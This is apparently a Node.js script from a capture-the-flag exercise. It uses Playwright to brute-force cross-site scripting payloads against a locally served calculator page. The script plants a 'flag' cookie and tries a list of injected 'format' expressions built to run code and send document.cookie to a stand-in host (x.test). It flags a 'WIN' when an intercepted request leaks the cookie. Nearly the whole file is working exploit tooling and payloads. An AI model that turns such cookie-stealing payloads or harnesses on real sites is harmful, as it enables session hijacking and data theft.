const http=require("http"),fs=require("fs"),path=require("path");
const {chromium}=require("playwright");
const SITE=path.join(__dirname,"site"),PORT=8099,COOKIE="FLAGMARK_abc123";
const server=http.createServer((req,res)=>{let p=decodeURIComponent(req.url.split("?")[0]);if(p==="/")p="/index.html";fs.readFile(path.join(SITE,p),(e,d)=>{if(e){res.writeHead(200,{"Content-Type":"text/html"});return res.end(fs.readFileSync(path.join(SITE,"index.html")));}const x=path.extname(p);res.writeHead(200,{"Content-Type":x===".js"?"text/javascript":x===".css"?"text/css":"text/html"});res.end(d);});});
const q=o=>Object.entries(o).map(([k,v])=>k+"="+encodeURIComponent(v)).join("&");
(async()=>{
  await new Promise(r=>server.listen(PORT,r));
  const browser=await chromium.launch();
  const ctx=await browser.newContext();
  await ctx.addCookies([{name:"flag",value:COOKIE,url:`http://localhost:${PORT}`,httpOnly:false}]);
  async function test(format,formula){
    const page=await ctx.newPage();const eg=[];
    page.on("dialog",d=>{eg.push("DLG:"+d.message().slice(0,90));d.dismiss().catch(()=>{});});
    await page.route("**",r=>{const u=r.request().url();if(u.startsWith(`http://localhost:${PORT}`))return r.continue();eg.push(u.slice(0,180));return r.abort();});
    const url=`http://localhost:${PORT}/?`+q({x:"1",y:"2",formula:formula||"x + y",format,autoEval:"1"});
    try{await page.goto(url,{waitUntil:"domcontentloaded",timeout:8000});}catch(e){}
    await page.waitForTimeout(800);
    let a="";try{a=await page.$eval("#answer",e=>e.textContent);}catch(e){a="(nav)";}
    await page.close();
    return {format,answer:(a||"").slice(0,35),eg,win:eg.some(e=>e.includes(COOKIE))};
  }
  const B="http://x.test/?c=";
  const P=[
    // navigation with concat attempts (existing globals only in strict)
    `,[location=name]`,
    `,[name="${B}"]+[location=name]+document.cookie`,
    `,[status="${B}"]+[location=status]`,
    // read cookie dotless: document[c] with c="cookie" (needs c global -> strict blocks create). try window[...]
    `,[location=document.cookie i]`,
    `,[location^="${B}"]`,
    `,[location*=document]`,
    // location.hash / search assignment (dot -> invalid). test:
    `,[location=document.URL]`,
    `,[location=document.domain]`,
    // routing to non-strict then create globals + navigate (inner=format, test anyway)
    `,setTimeout.call`,
    `,eval.call`,
    // use values.formula as a URL: formula=full evil url
    `,[location=values]`,
    // try tag-based selector so eval sees member: value.formula navigation
    // combine: set location to name after building name via concat of two existing-global reads
    `,[name=document]+[location=name]`,
    // document.cookie coercion into location via array element order
    `,[location="${B}"]`,           // baseline nav (no cookie)
  ];
  console.log("== brute2 ==");
  for(const f of P){const r=await test(f, "http://x.test/EVILFORMULA");console.log((r.win?"WIN ":"    ")+JSON.stringify(r));}

  // Non-strict routing test: run format as inner code via setTimeout(string). 
  // We can't pass a separate payload, but test if inner non-strict can create globals + navigate w/ cookie
  // by making format a self-contained non-strict exfil that is ALSO valid selector + valid outer JS.
  console.log("== routing/self-eval tests ==");
  const R=[
    `+eval.call`,
    `+setTimeout.call`,
  ];
  for(const f of R){const r=await test(f,null);console.log(JSON.stringify(r));}
  await browser.close();server.close();
})();
